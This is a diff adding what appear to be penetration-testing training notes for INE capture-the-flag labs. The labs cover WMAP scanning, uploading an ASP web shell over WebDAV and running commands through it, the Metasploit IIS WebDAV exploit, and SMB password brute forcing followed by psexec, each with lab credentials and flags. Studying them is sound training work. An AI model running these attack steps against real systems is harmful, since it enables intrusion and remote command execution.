@@ -1062,3 +1062,174 @@ These labs explored:
 Practice with these techniques sharpens real-world penetration testing skills.
 
 ---
+# Web Application and Windows Exploitation Labs
+
+## Lab 1: Web App Vulnerability Scanning With WMAP
+
+### Steps:
+1. **Open Kali GUI Instance**  
+2. **Identify Target IP Address**  
+   ```bash
+   ifconfig
+   ```
+3. **Start Metasploit Framework Console**
+   ```bash
+   msfconsole
+   ```
+4. **Load WMAP Module**
+   ```bash
+   load wmap
+   ```
+5. **Add Target Site**
+   ```bash
+   wmap_sites -a 192.157.89.3
+   ```
+6. **Add Target as Web App**
+   ```bash
+   wmap_targets -t http://192.157.89.3
+   ```
+7. **List Sites and Targets**
+   ```bash
+   wmap_sites -l
+   wmap_targets -l
+   ```
+8. **Run Test Scan**
+   ```bash
+   wmap_run -t
+   ```
+9. **Run Enabled Modules**
+   ```bash
+   wmap_run -e
+   ```
+
+---
+
+## Lab 2: Windows - IIS Server DAVTest
+
+### Steps:
+1. **Open Kali Machine**
+2. **Run Nmap Scan**
+   ```bash
+   nmap demo.ine.local
+   ```
+3. **Run http-enum Script**
+   ```bash
+   nmap --script http-enum -sV -p 80 demo.ine.local
+   ```
+4. **Run DAVTest (Unauthenticated)**
+   ```bash
+   davtest -url http://demo.ine.local/webdav
+   ```
+5. **Run DAVTest (Authenticated)**
+   ```bash
+   davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
+   ```
+6. **Use Cadaver to Upload .asp Web Shell**
+   ```bash
+   cadaver http://demo.ine.local/webdav
+   ```
+   Enter credentials: `bob:password_123321`
+   ```bash
+   put /usr/share/webshells/asp/webshell.asp
+   ls
+   ```
+7. **Access Web Shell in Browser**  
+   URL: `http://demo.ine.local/webdav/webshell.asp`
+
+8. **Execute Command**
+   ```text
+   http://demo.ine.local/webdav/webshell.asp?cmd=whoami
+   ```
+
+9. **Read the Flag**
+   ```text
+   http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
+   ```
+
+**Flag:** `0cc175b9c0f1b6a831c399e269772661`
+
+---
+
+## Lab 3: Windows - IIS Server: WebDav Metasploit
+
+### Steps:
+1. **Open Kali Machine**
+2. **Run Nmap Scan**
+   ```bash
+   nmap demo.ine.local
+   ```
+3. **Run http-enum Script**
+   ```bash
+   nmap --script http-enum -sV -p 80 demo.ine.local
+   ```
+   *If slow, use:*
+   ```bash
+   dirb demo.ine.local
+   ```
+4. **Run DAVTest**
+   ```bash
+   davtest -url http://demo.ine.local/webdav
+   davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
+   ```
+5. **Run Metasploit Exploit**
+   ```bash
+   msfconsole -q
+   use exploit/windows/iis/iis_webdav_upload_asp
+   set RHOSTS demo.ine.local
+   set HttpUsername bob
+   set HttpPassword password_123321
+   set PATH /webdav/metasploit%RAND%.asp
+   exploit
+   ```
+6. **Read the Flag**
+   ```bash
+   shell
+   cd /
+   dir
+   type flag.txt
+   ```
+
+**Flag:** `d3aff16a801b4b7d36b4da1094bee345`
+
+---
+
+## Lab 4: Windows - SMB Server PSexec
+
+### Steps:
+1. **Open Kali Machine**
+2. **Run Nmap Scan**
+   ```bash
+   nmap demo.ine.local
+   ```
+3. **Check SMB Protocols**
+   ```bash
+   nmap -p445 --script smb-protocols demo.ine.local
+   ```
+4. **Run SMB Login Module**
+   ```bash
+   msfconsole -q
+   use auxiliary/scanner/smb/smb_login
+   set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+   set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+   set RHOSTS demo.ine.local
+   set VERBOSE false
+   exploit
+   ```
+5. **Run PSexec Module**
+   ```bash
+   msfconsole -q
+   use exploit/windows/smb/psexec
+   set RHOSTS demo.ine.local
+   set SMBUser Administrator
+   set SMBPass qwertyuiop
+   exploit
+   ```
+6. **Read the Flag**
+   ```bash
+   shell
+   cd /
+   dir
+   type flag.txt
+   ```
+
+
